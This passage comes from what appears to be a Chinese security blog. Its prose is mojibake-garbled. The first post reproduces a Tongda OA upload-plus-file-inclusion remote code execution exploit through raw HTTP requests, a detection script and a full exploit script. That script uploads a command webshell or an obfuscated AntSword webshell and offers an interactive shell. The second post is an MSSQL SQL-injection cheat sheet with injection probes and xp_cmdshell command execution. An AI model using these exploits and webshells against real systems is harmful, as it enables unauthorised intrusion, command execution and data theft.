<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 22 Mar 2020 14:03:32 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Set-Cookie: PHPSESSID=123; path=/</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 37</span><br><span class="line"></span><br><span class="line">+OK [vm]252@2003_225735032|jpg|0[/vm]</span><br></pre></td></tr></table></figure>

<h3 id="æ–‡ä»¶åŒ…å«-1"><a href="#æ–‡ä»¶åŒ…å«-1" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p><strong>Requestï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 192.168.95.129</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://192.168.95.129/logincheck.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=gb4tpaqrsagb3fcmpu9sco48m5; KEY_RANDOMDATA=13319</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 71</span><br><span class="line"></span><br><span class="line">json=&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;/general/../../attach/im/2003/225735032.jpg&quot;</span>&#125;&amp;cmd=net user</span><br></pre></td></tr></table></figure>

<p><strong>Responseï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 22 Mar 2020 14:06:54 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\\ çš„ç”¨æˆ·å¸æˆ·</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    </span><br><span class="line">å‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç°ä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­å¯ä»¥é€šè¿‡åŒ…å«nginxæ—¥å¿—æ–‡ä»¶æ¥å®ç°å¿«é€Ÿæ¢æµ‹æ˜¯å¦å­˜åœ¨æ”¹æ¼æ´ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¾¾OAä»»æ„æ–‡ä»¶åŒ…å«</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>(<span class="params">url</span>):</span></span><br><span class="line">	exp1 = <span class="string">&quot;/ispirit/interface/gateway.php?json=\&#123;\&#125;&amp;aa=&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;biubiubiu_testcc&#x27;);?&quot;</span></span><br><span class="line">	exp2 = <span class="string">&quot;/ispirit/interface/gateway.php&quot;</span></span><br><span class="line"></span><br><span class="line">	exp3 = <span class="string">&quot;/mac/gateway.php?json=\&#123;\&#125;&amp;aa=&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;biubiubiu_testcc&#x27;);?&quot;</span></span><br><span class="line">	exp4 = <span class="string">&quot;/mac/gateway.php&quot;</span></span><br><span class="line"></span><br><span class="line">	data = &#123;<span class="string">&quot;json&quot;</span>:<span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;/general/../../nginx/logs/oa.access.log\&quot;&#125;&quot;</span>&#125;</span><br><span class="line">	response1 = requests.get(url+exp1,timeout=<span class="number">2</span>,verify=<span class="literal">False</span>)</span><br><span class="line">	response2 = requests.post(url+exp2,data=data,timeout=<span class="number">2</span>,verify=<span class="literal">False</span>)</span><br><span class="line">	response3 = requests.get(url+exp3,timeout=<span class="number">2</span>,verify=<span class="literal">False</span>)</span><br><span class="line">	response4 = requests.post(url+exp4,data=data,timeout=<span class="number">2</span>,verify=<span class="literal">False</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;biubiubiu_testcc&#x27;</span> <span class="keyword">in</span> response2.text <span class="keyword">or</span> <span class="string">&#x27;biubiubiu_testcc&#x27;</span> <span class="keyword">in</span> response4.text:</span><br><span class="line">		print(<span class="string">&#x27;[+]å­˜åœ¨è¯¥æ¼æ´:&#x27;</span>+)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">&#x27;[-]ç›®æ ‡ä¸å­˜åœ¨è¯¥æ¼æ´&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	args = sys.argv[<span class="number">1</span>]</span><br><span class="line">	get_one(args)</span><br></pre></td></tr></table></figure>

<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ä¸¤ä¸ªç‰ˆæœ¬å‡æµ‹è¯•ï¼Œæ‰§è¡Œå‘½ä»¤ORå†™å…¥SHELLã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># FileName  :  tongda_oa_rce.py</span></span><br><span class="line"><span class="comment"># Time      :  2020/03/24 10:39:18</span></span><br><span class="line"><span class="comment"># Author    :  OuDeNiu</span></span><br><span class="line"><span class="comment"># Email     :  havebutno@gmail.com</span></span><br><span class="line"><span class="comment"># Version   :  1.0</span></span><br><span class="line"><span class="comment"># Descript  :  å®‰è£…ç¯å¢ƒä¸åŒï¼Œè·¯å¾„ä¸åŒã€‚æµ‹è¯•ç¯å¢ƒ -&gt; Win10 / OA 2017</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># CMDé©¬</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_shell</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;1.txt&#x27;</span>):</span><br><span class="line">        f=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$command=$_POST[&#x27;tdoa&#x27;];</span></span><br><span class="line"><span class="string">$wsh = new COM(&#x27;WScript.shell&#x27;);</span></span><br><span class="line"><span class="string">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span></span><br><span class="line"><span class="string">$stdout = $exec-&gt;StdOut();</span></span><br><span class="line"><span class="string">$stroutput = $stdout-&gt;ReadAll();</span></span><br><span class="line"><span class="string">echo $stroutput;</span></span><br><span class="line"><span class="string">?&gt;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥èšå‰‘é©¬</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_ant</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;1.txt&#x27;</span>):</span><br><span class="line">        f=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">        $fp = fopen(&#x27;readme.php&#x27;, &#x27;w&#x27;);</span></span><br><span class="line"><span class="string">        $a = base64_decode(&quot;JTNDJTNGcGhwJTIwJTBBY2xhc3MlMjBXRVdEJTIwJTdCJTIwJTBBJTIwJTIwJTIwJTIwZnVuY3Rpb24lMjBvQnZyJTI4JTI5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTI0d0FiRiUyMCUzRCUyMCUyMiU1Q3hlNiUyMiUyMCU1RSUyMCUyMiU1Q3g4NyUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyNHBsRVclMjAlM0QlMjAlMjIlNUN4MTglMjIlMjAlNUUlMjAlMjIlNUN4NmIlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjRiZVVoJTIwJTNEJTIwJTIyJTVDeGZlJTIyJTIwJTVFJTIwJTIyJTVDeDhkJTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTI0RnpJWiUyMCUzRCUyMCUyMiU1Q3g3MiUyMiUyMCU1RSUyMCUyMiU1Q3gxNyUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyNGx2S0MlMjAlM0QlMjAlMjIlNUN4MmQlMjIlMjAlNUUlMjAlMjIlNUN4NWYlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjRSR1ZLJTIwJTNEJTIwJTIyJTVDeGQwJTIyJTIwJTVFJTIwJTIyJTVDeGE0JTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTI0TGlQdSUyMCUzRCUyNHdBYkYuJTI0cGxFVy4lMjRiZVVoLiUyNEZ6SVouJTI0bHZLQy4lMjRSR1ZLJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcmV0dXJuJTIwJTI0TGlQdSUzQiUwQSUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMGZ1bmN0aW9uJTIwX19kZXN0cnVjdCUyOCUyOSU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyNHpwY1QlM0QlMjR0aGlzLSUzRW9CdnIlMjglMjklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBAJTI0enBjVCUyOCUyNHRoaXMtJTNFQUQlMjklM0IlMEElMjAlMjAlMjAlMjAlN0QlMEElN0QlMEElMjR3ZXdkJTIwJTNEJTIwbmV3JTIwV0VXRCUyOCUyOSUzQiUwQUAlMjR3ZXdkLSUzRUFEJTIwJTNEJTIwaXNzZXQlMjglMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklM0ZiYXNlNjRfZGVjb2RlJTI4JTI0X1BPU1QlNUIlMjd0ZG9hJTI3JTVEJTI5JTNBJTI0X1BPU1QlNUIlMjd0ZG9hJTI3JTVEJTNCJTBBJTNGJTNF&quot;);</span></span><br><span class="line"><span class="string">        fwrite($fp, urldecode($a));</span></span><br><span class="line"><span class="string">        fclose($fp);</span></span><br><span class="line"><span class="string">        ?&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤å½“å‰ç›®å½•ä¸‹ç”Ÿæˆçš„é©¬</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_shell</span>():</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;1.txt&#x27;</span>):</span><br><span class="line">        os.remove(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce_1</span>(<span class="params">url,cmd,shell</span>):</span></span><br><span class="line">    upload_url = url+ <span class="string">&quot;/ispirit/im/upload.php&quot;</span></span><br><span class="line">    include_url = url + <span class="string">&quot;/ispirit/interface/gateway.php&quot;</span></span><br><span class="line">    shell_url= url + <span class="string">&quot;/ispirit/interface/readme.php&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> int(shell) == <span class="number">0</span>:</span><br><span class="line">        write_shell()</span><br><span class="line">        files = &#123;<span class="string">&#x27;ATTACHMENT&#x27;</span>:open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">        upload_data=&#123;<span class="string">&quot;P&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;DEST_UID&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;UPLOAD_MODE&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># ä¸Šä¼ </span></span><br><span class="line">        upload_res = requests.post(upload_url,upload_data,files=files)</span><br><span class="line">        path = upload_res.text</span><br><span class="line">        path = path[path.find(<span class="string">&#x27;@&#x27;</span>)+<span class="number">1</span>:path.rfind(<span class="string">&#x27;|&#x27;</span>)].replace(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;/&quot;</span>).replace(<span class="string">&quot;|&quot;</span>,<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> cmd !=<span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            cmd = input(<span class="string">&quot;[Cmd]:&quot;</span>)</span><br><span class="line">            include_data = &#123;<span class="string">&quot;json&quot;</span>:<span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;/general/../../attach/im/&quot;</span> +path+<span class="string">&quot;\&quot;&#125;&quot;</span>,<span class="string">&quot;tdoa&quot;</span>:cmd&#125;</span><br><span class="line">            <span class="comment"># æ–‡ä»¶åŒ…å«</span></span><br><span class="line">            include_res = requests.post(include_url,data=include_data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;403&quot;</span> <span class="keyword">in</span> include_res.text <span class="keyword">or</span> <span class="string">&quot;No input file&quot;</span> <span class="keyword">in</span> include_res.text:</span><br><span class="line">                include_url = url + <span class="string">&quot;/mac/gateway.php&quot;</span></span><br><span class="line">                <span class="comment"># shell_url= url + &quot;/mac/readme.php&quot;</span></span><br><span class="line">                include_res = requests.post(include_url,data=include_data)</span><br><span class="line">                print(include_res.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(include_res.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GetShell</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        write_ant()</span><br><span class="line">        files = &#123;<span class="string">&#x27;ATTACHMENT&#x27;</span>:open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">        upload_data=&#123;<span class="string">&quot;P&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;DEST_UID&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;UPLOAD_MODE&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">        upload_res = requests.post(upload_url,upload_data,files=files)</span><br><span class="line">        path = upload_res.text</span><br><span class="line">        path = path[path.find(<span class="string">&#x27;@&#x27;</span>)+<span class="number">1</span>:path.rfind(<span class="string">&#x27;|&#x27;</span>)].replace(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;/&quot;</span>).replace(<span class="string">&quot;|&quot;</span>,<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        include_data = &#123;<span class="string">&quot;json&quot;</span>:<span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;/general/../../attach/im/&quot;</span> +path+<span class="string">&quot;\&quot;&#125;&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># æ–‡ä»¶åŒ…å«</span></span><br><span class="line">        include_res = requests.post(include_url,data=include_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;403&quot;</span> <span class="keyword">in</span> include_res.text <span class="keyword">or</span> <span class="string">&quot;No input file&quot;</span> <span class="keyword">in</span> include_res.text:</span><br><span class="line">            include_url = url + <span class="string">&quot;/mac/gateway.php&quot;</span></span><br><span class="line">            shell_url= url + <span class="string">&quot;/mac/readme.php&quot;</span></span><br><span class="line">            include_res = requests.post(include_url,data=include_data)</span><br><span class="line">        shell_res=requests.get(shell_url)</span><br><span class="line">        <span class="keyword">if</span> shell_res.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&#x27;[+]æˆåŠŸGetShell:&#x27;</span>+url+<span class="string">&#x27;/mac/readme.php&#x27;</span>)</span><br><span class="line">            print(shell_res.text)</span><br><span class="line">        <span class="keyword">else</span>:print(<span class="string">&#x27;[-]å†™å…¥shellå¤±è´¥&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[*]é€šè¾¾OAæ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å« RCE</span></span><br><span class="line"><span class="string">Usage:python3 http://xxxxxxx.com Options</span></span><br><span class="line"><span class="string">0:Exec CMD &#123;q -&gt; quit&#125;</span></span><br><span class="line"><span class="string">1:Get Shell &#123;AntSword -&gt; tdoa&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">print(banner)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    other = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    exit(<span class="string">&#x27;[-]å‚æ•°é”™è¯¯&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> int(other) != <span class="number">0</span>:</span><br><span class="line">    shell = other</span><br><span class="line"><span class="keyword">else</span>:shell = <span class="number">0</span></span><br><span class="line">rce_1(url,<span class="literal">None</span>,shell)</span><br><span class="line">del_shell()</span><br></pre></td></tr></table></figure>

<p>æ»´æ»´æ»´ï¼šåŸæœ¬æ˜¯æœ‰å›¾ç‰‡çš„ï¼Œä½†æ˜¯è«åå…¶å¦™çš„ä¸è§äº†ï¼Œç¯å¢ƒå·²ç»åˆ äº†ï¼Œæ‰€ä»¥ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>é€šè¾¾</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title>MSSQLå°ç»“</title>
    <url>/posts/546e1e49/</url>
    <content><![CDATA[<p>MSSQLæ˜¯æŒ‡å¾®è½¯çš„SQL Serveræ•°æ®åº“æœåŠ¡å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ•°æ®åº“å¹³å°ï¼Œæä¾›æ•°æ®åº“çš„ä»æœåŠ¡å™¨åˆ°ç»ˆç«¯çš„å®Œæ•´çš„è§£å†³æ–¹æ¡ˆï¼Œå…¶ä¸­æ•°æ®åº“æœåŠ¡å™¨éƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œç”¨äºå»ºç«‹ã€ä½¿ç”¨å’Œç»´æŠ¤æ•°æ®åº“ã€‚å±å…³ç³»å‹æ•°æ®åº“ã€‚</p>
<a id="more"></a>

<h1 id="SQL-Serveræ‰‹å·¥æ³¨å…¥"><a href="#SQL-Serveræ‰‹å·¥æ³¨å…¥" class="headerlink" title="SQL Serveræ‰‹å·¥æ³¨å…¥"></a>SQL Serveræ‰‹å·¥æ³¨å…¥</h1><p>MSSQLæ˜¯æŒ‡å¾®è½¯çš„SQL Serveræ•°æ®åº“æœåŠ¡å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ•°æ®åº“å¹³å°ï¼Œæä¾›æ•°æ®åº“çš„ä»æœåŠ¡å™¨åˆ°ç»ˆç«¯çš„å®Œæ•´çš„è§£å†³æ–¹æ¡ˆï¼Œå…¶ä¸­æ•°æ®åº“æœåŠ¡å™¨éƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œç”¨äºå»ºç«‹ã€ä½¿ç”¨å’Œç»´æŠ¤æ•°æ®åº“ã€‚å±å…³ç³»å‹æ•°æ®åº“</p>
<p>MSSQLä¸­æ¯ä¸ªåº“éƒ½æœ‰ä¸€ä¸ªç³»ç»Ÿè‡ªå¸¦è¡¨â€“&gt;sysobjects</p>
<p>æ­¤ç³»ç»Ÿè¡¨ä¸­å¯¹æˆ‘ä»¬æœ‰ç”¨çš„åªæœ‰3ä¸ªå­—æ®µï¼ŒNAMEå­—æ®µå’ŒXTYPEå­—æ®µå’ŒIDå­—æ®µï¼Œnameå°±æ˜¯è¡¨åä¿¡æ¯ï¼Œxtypeæ˜¯ä»£è¡¨è¡¨çš„ç±»å‹ï¼Œåªæœ‰ä¸¤ä¸ªå‚æ•°ï¼ŒSä»£è¡¨ç³»ç»Ÿè‡ªå¸¦è¡¨ï¼ŒUä»£è¡¨ç”¨æˆ·åˆ›å»ºçš„è¡¨ï¼Œidå­—æ®µçš„å€¼ç”¨æ¥è¿æ¥syscolumnsè¡¨</p>
<h2 id="é€šç”¨"><a href="#é€šç”¨" class="headerlink" title="é€šç”¨"></a>é€šç”¨</h2><p>ä¸‰ä¸ªæƒé™ï¼š<code>sysadmin</code>ã€<code>db_owner</code>ã€<code>public</code></p>
<ul>
<li>sysadminï¼šå¯ä»¥æ‰§è¡Œæ‰€æœ‰æ“ä½œ</li>
<li>db_ownerï¼šå¯ä»¥æ‰§è¡Œæ•°æ®åº“æ“ä½œ</li>
<li>publicï¼šåªèƒ½æ‰§è¡ŒæŸ¥è¯¢æ“ä½œ</li>
</ul>
<h3 id="æ•°æ®åº“åˆ¤æ–­"><a href="#æ•°æ®åº“åˆ¤æ–­" class="headerlink" title="æ•°æ®åº“åˆ¤æ–­"></a>æ•°æ®åº“åˆ¤æ–­</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;and user&gt;0</span><br><span class="line">;and (select count(*) from sysobjects)&gt;0 mssql</span><br><span class="line">;and (select count(*) from msysobjects)&gt;0 access</span><br></pre></td></tr></table></figure>

<h3 id="å¸¸ç”¨å‡½æ•°-è¯­å¥"><a href="#å¸¸ç”¨å‡½æ•°-è¯­å¥" class="headerlink" title="å¸¸ç”¨å‡½æ•°/è¯­å¥"></a>å¸¸ç”¨å‡½æ•°/è¯­å¥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if() </span><br><span class="line">exists()</span><br><span class="line">SysDatabases		-- ä¸»æ•°æ®åº“æœåŠ¡å™¨ä¸­çš„æ•°æ®åº“. åˆå®‰è£… SQL Server æ—¶,sysdatabases åŒ…å« master,model,msdb,mssqlwebå’Œtempdbæ•°æ®åº“çš„é¡¹ã€‚è¯¥è¡¨åªå­˜å‚¨åœ¨ master æ•°æ®åº“ä¸­ã€‚</span><br><span class="line">SysObjects 			--åœ¨æ•°æ®åº“å†…åˆ›å»ºçš„æ¯ä¸ªå¯¹è±¡ï¼ˆçº¦æŸã€é»˜è®¤å€¼ã€æ—¥å¿—ã€è§„åˆ™ã€å­˜å‚¨è¿‡ç¨‹ç­‰ï¼‰åœ¨è¡¨ä¸­å ä¸€è¡Œã€‚åªæœ‰åœ¨ tempdb å†…ï¼Œæ¯ä¸ªä¸´æ—¶å¯¹è±¡æ‰åœ¨è¯¥è¡¨ä¸­å ä¸€è¡Œã€‚</span><br><span class="line">SysColumns			-- æ¯ä¸ªæ•°æ®åº“åˆ›å»ºåéƒ½ä¼šæœ‰ä¸€äº›ç³»ç»Ÿè¡¨ç”¨æ¥å­˜å‚¨è¯¥æ•°æ®åº“çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚æ¯ä¸ªè¡¨å’Œè§†å›¾ä¸­çš„æ¯åˆ—åœ¨è¡¨ä¸­å ä¸€è¡Œï¼Œå­˜å‚¨è¿‡ç¨‹ä¸­çš„æ¯ä¸ªå‚æ•°åœ¨è¡¨ä¸­ä¹Ÿå ä¸€è¡Œã€‚</span><br><span class="line">select @@version -- ç‰ˆvæœ¬</span><br><span class="line">select db_name() -- åº“å</span><br><span class="line">select user -- ç”¨æˆ·å</span><br><span class="line">select @@SERVERNAME -- æœåŠ¡å™¨ä¸»æœºå</span><br><span class="line">select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) --åˆ¤æ–­æ˜¯ä¸æ˜¯ç®¡ç†å‘˜ï¼Œæ˜¯åˆ™è¿”å›1 ï¼Œå¦è¿”å›0</span><br><span class="line">exec master..xp_cmdshell &quot;ipconfig&quot; --è°ƒç”¨xp_cmdshellæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br><span class="line"></span><br><span class="line">Select Name FROM Master..SysDatabases order by Name -- è·å–æ‰€æœ‰æ•°æ®åº“å</span><br><span class="line">Select Name FROM SysObjects Where XType&#x3D;&#39;U&#39; orDER BY Name  -- å½“å‰åº“çš„è¡¨å</span><br><span class="line">-- XType&#x3D;&#39;U&#39;:è¡¨ç¤ºæ‰€æœ‰ç”¨æˆ·è¡¨; </span><br><span class="line">-- XType&#x3D;&#39;S&#39;:è¡¨ç¤ºæ‰€æœ‰ç³»ç»Ÿè¡¨;</span><br><span class="line">Select Name FROM SysColumns Where id&#x3D;Object_Id(&#39;è¡¨å&#39;) -- æŒ‡å®šè¡¨çš„å­—æ®µå</span><br></pre></td></tr></table></figure>

<h3 id="SysDatabasesä»‹ç»"><a href="#SysDatabasesä»‹ç»" class="headerlink" title="SysDatabasesä»‹ç»"></a>SysDatabasesä»‹ç»</h3><p><code>SysDatabases</code>ä¸»æ•°æ®åº“æœåŠ¡å™¨ä¸­çš„æ•°æ®åº“. åˆå®‰è£… SQL Server æ—¶,sysdatabases åŒ…å« master,model,msdb,mssqlwebå’Œtempdbæ•°æ®åº“çš„é¡¹ã€‚è¯¥è¡¨åªå­˜å‚¨åœ¨ master æ•°æ®åº“ä¸­ã€‚è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th><strong>åˆ—å</strong></th>
<th><strong>æ•°æ®ç±»å‹</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>sysname</td>
<td>æ•°æ®åº“çš„åç§°ã€‚</td>
</tr>
<tr>
<td>dbid</td>
<td>smallint</td>
<td>æ•°æ®åº“ IDã€‚</td>
</tr>
<tr>
<td>sid</td>
<td>varbinary(85)</td>
<td>æ•°æ®åº“åˆ›å»ºè€…çš„ç³»ç»Ÿ IDã€‚</td>
</tr>
<tr>
<td>mode</td>
<td>smallint</td>
<td>ç”¨äºåˆ›å»ºæ•°æ®åº“æ—¶åœ¨å†…éƒ¨é”å®šè¯¥æ•°æ®åº“ã€‚</td>
</tr>
<tr>
<td>status</td>
<td>int</td>
<td>çŠ¶æ€ä½ï¼Œå…¶ä¸­æŸäº›çŠ¶æ€ä½å¯ç”±ç”¨æˆ·ä½¿ç”¨ sp_dboption  ï¼ˆ read only  ã€ dbo use only  ã€ single user  ç­‰ï¼‰è¿›è¡Œè®¾ç½®ï¼š  <br>1 = autoclose  ï¼›ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚ <br> 4 = select into/bulkcopy ï¼›ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚ <br> 8 = trunc. log on chkpt ï¼›ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>16 = torn page detection ï¼Œä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚ <br> 32 = loading  ã€‚  <br>64 = pre recovery  ã€‚ <br> 128 = recovering  ã€‚ <br> 256 = not recovered  ã€‚  <br>512 = offline  ï¼›ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚ <br> 1024 = read only  ï¼›ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚ <br> 2048 = dbo use only  ï¼›ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚ <br> 4096 = single user  ï¼›ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>32768 = emergency mode ã€‚ <br>4194304 = autoshrink  ã€‚  <br>1073741824 = cleanly shutdown ã€‚ <br>å¯ä»¥åŒæ—¶æ‰“å¼€å¤šä¸ªä½ã€‚</td>
</tr>
<tr>
<td>status2</td>
<td>int</td>
